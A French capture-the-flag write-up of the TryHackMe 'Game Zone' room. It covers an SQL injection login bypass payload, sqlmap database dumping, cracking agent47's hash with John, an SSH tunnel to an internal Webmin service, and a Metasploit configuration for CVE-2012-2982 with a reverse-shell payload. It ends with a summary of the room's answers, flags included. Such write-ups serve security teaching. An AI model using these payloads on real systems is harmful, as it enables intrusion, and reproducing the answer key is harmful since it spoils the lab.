# TryHackMe: Game Zone

**Objectif :** exploiter l'injection SQL du portail web, recuperer et casser le hash de l'utilisateur `agent47`, obtenir un acces SSH, exposer le service Webmin interne via un tunnel SSH, puis exploiter Webmin pour obtenir root.

---

## Introduction

La room **Game Zone** est une tres bonne machine de transition entre :

- web app exploitation
- cracking de hash
- tunneling SSH
- exploitation d'un service interne

Elle est plus interessante qu'une simple machine SQLi, parce qu'elle montre bien qu'un service non expose publiquement peut tout de meme devenir exploitable apres un premier acces.

---

## Task 1: Deploy the vulnerable machine

### Question 1: Deploy the machine

Je deploie la cible et j'attends qu'elle soit disponible.

### Reponse

`Done`

---

## Task 2: Obtain access via SQL injection

### Enumeration initiale

Je lance :

```bash
nmap -sC -sV -Pn <IP>
```

Le scan remonte :

- `22/tcp` - SSH
- `80/tcp` - HTTP

Le portail Game Zone se trouve sur le port 80.

### Login manuel par SQLi

Le formulaire de login est vulnerable. Une charge simple de type :

```text
' or 1=1 -- -
```

permet de contourner l'authentification.

### Question 1: What was the SQL query changed to?

La requete transformee est :

```text
SELECT * from users where username = '' or 1=1 -- -' and pwd = ''
```

### Reponse

**Modified SQL query:** `SELECT * from users where username = '' or 1=1 -- -' and pwd = ''`

### Question 2: Using SQLMap what is the name of the field vulnerable to SQLi?

Je laisse sqlmap confirmer la faille :

```bash
sqlmap -u http://<IP>/portal.php --forms --batch
```

Le champ vulnerable est :

```text
searchitem
```

### Reponse

**Vulnerable field:** `searchitem`

### Question 3: What was the table name?

En enumerant la base :

```bash
sqlmap -u http://<IP>/portal.php --data="searchitem=test" --dbms=mysql --dump
```

On trouve une table d'utilisateurs, et une autre table :

```text
post
```

### Reponse

**Other table name:** `post`

### Question 4: What was the username associated with the hashed password?

La table `users` contient :

- un hash SHA-256
- l'utilisateur associe

La source publique converge sur :

```text
agent47
```

### Reponse

**Username associated with hash:** `agent47`

### Question 5: What was the password hash?

Le hash recupere est :

```text
ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
```

### Reponse

**Password hash:** `ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14`

---

## Task 4: Cracking a password with JohnTheRipper

### Question 1: What is the de-hashed password?

Je sauvegarde le hash :

```bash
echo "ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14" > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
```

Le mot de passe cracke est :

```text
videogamer124
```

### Reponse

**De-hashed password:** `videogamer124`

### Question 2: Now you have a password and username. Try SSH’ing onto the machine. What is the user flag?

Je me connecte :

```bash
ssh agent47@<IP>
```

Mot de passe :

```text
videogamer124
```

Puis :

```bash
cat /home/agent47/user.txt
```

### Reponse

**user.txt:** `649ac17b1480ac13ef1e4fa579dac95c`

---

## Task 5: Exposing services with reverse SSH tunnels

Une fois sur la machine, je cherche les sockets ouvertes :

```bash
ss -tulpn
```

### Question 1: How many TCP sockets are running?

Je retrouve **5 sockets TCP en ecoute**.

### Reponse

**TCP sockets running:** `5`

### Question 2: What is the name of the exposed CMS?

Un service interne ecoute sur `127.0.0.1:10000`. J'expose ce port localement :

```bash
ssh -L 10000:127.0.0.1:10000 agent47@<IP>
```

En ouvrant ensuite :

```text
http://127.0.0.1:10000
```

je tombe sur :

```text
Webmin
```

### Reponse

**Exposed CMS:** `Webmin`

### Question 3: What is the CMS version?

Je confirme avec Nmap en local :

```bash
nmap -sV -p 10000 127.0.0.1
```

La version remontee est :

```text
1.580
```

### Reponse

**CMS version:** `1.580`

---

## Task 6: Privilege Escalation with Metasploit

La version Webmin 1.580 est connue pour une RCE.

### Recherche du module

```text
msfconsole
search CVE-2012-2982
```

Le module pertinent est :

```text
exploit/unix/webapp/webmin_show_cgi_exec
```

Je le configure ainsi :

```text
use exploit/unix/webapp/webmin_show_cgi_exec
set RHOSTS 127.0.0.1
set RPORT 10000
set SSL false
set USERNAME agent47
set PASSWORD videogamer124
set PAYLOAD cmd/unix/reverse
set LHOST <MON_IP_THM>
run
```

Le point important est que `RHOSTS` vaut `127.0.0.1`, car on passe par le tunnel SSH.

Une fois le module execute, j'obtiens un shell root.

### Question 1: What is the root flag?

Je lis ensuite :

```bash
cat /root/root.txt
```

### Reponse

**root.txt:** `a4b945830144bdd71908d12d902adeee`

---

## Resume des reponses de la room

- Deploy the machine `Done`
- What was the SQL query changed to? `SELECT * from users where username = '' or 1=1 -- -' and pwd = ''`
- Using SQLMap what is the name of the field vulnerable to SQLi? `searchitem`
- What was the table name? `post`
- What was the username associated with the hashed password? `agent47`
- What was the password hash? `ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14`
- What is the de-hashed password? `videogamer124`
- What is the user flag? `649ac17b1480ac13ef1e4fa579dac95c`
- How many TCP sockets are running? `5`
- What is the name of the exposed CMS? `Webmin`
- What is the CMS version? `1.580`
- What is the root flag? `a4b945830144bdd71908d12d902adeee`

---

## Conclusion

**Game Zone** est une room tres utile parce qu'elle oblige a ne pas s'arreter au premier shell. L'injection SQL donne l'acces initial, mais c'est le tunnel SSH qui revele le vrai service critique, et donc la voie vers root.

***Auteur*** *: Saad Idrissi*
